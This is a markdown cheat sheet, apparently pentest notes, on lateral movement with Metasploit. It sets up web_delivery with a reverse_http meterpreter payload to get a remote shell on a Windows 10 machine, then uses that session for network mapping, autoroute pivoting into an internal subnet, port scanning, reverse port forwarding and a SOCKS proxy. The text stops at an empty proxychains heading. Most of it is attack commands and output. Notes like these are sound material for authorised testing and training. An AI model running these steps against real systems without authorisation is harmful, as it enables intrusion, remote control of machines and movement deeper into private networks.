# lateral -movement

## metasploit

get a shell on windows 10 machine. here is an example:

On Kali:

```bash
msf6 > search web_delivery
msf6 > use 1
msf6 exploit(multi/script/web_delivery) > options
...
msf6 exploit(multi/script/web_delivery) > set lhost eth0
msf6 exploit(multi/script/web_delivery) > set lport 1337
msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_http
msf6 exploit(multi/script/web_delivery) > set target 2
msf6 exploit(multi/script/web_delivery) > exploit -j
```

On Windows:

```powershell
PS > <run whatever they tell you to run>
```

Back to Kali, enter session:

```bash
msf6 exploit(multi/script/web_delivery) > sessions
...
msf6 exploit(multi/script/web_delivery) > sessions -i 1
```

```bash
meterpreter > 
```

## basic network mapping using built-in windows commands

```
meterpreter > ipconfig
meterpreter > arp -a
```

## set up routes on metasploit

On msf5:

```bash
meterpreter > run autoroute -s <network-id/subnet>
```

```bash
meterpreter > run autoroute -p
```

```
IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.16.0       255.255.255.0      Session 1
```

On msf6:

```bash
meterpreter > run post/multi/manage/autoroute cmd=add SUBNET=<subnet> NETMASK=<netmask>
```

```bash
meterpreter > run post/multi/manage/autoroute cmd=add SUBNET=192.168.16.0 NETMASK=/24
```

```bash
meterpreter > run post/multi/manage/autoroute cmd=print
```

```
IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.168.16.0       255.255.255.0      Session 1
```

## more advanced network mapping

```
use auxiliary/scanner/portscan/tcp
```

## reverse port forwarding

```bash
meterpreter > portfwd add -R -p <local-listening-port> -l <port-to-forward-to> -L <IP-to-forward-to>  
```

```bash
meterpreter > portfwd add -R -p 1234 -l 443 -L 192.168.3.28
```

Run proxy server on Kali:

```bash
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set srvport 9050
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > exploit -j
```

Run proxychains:

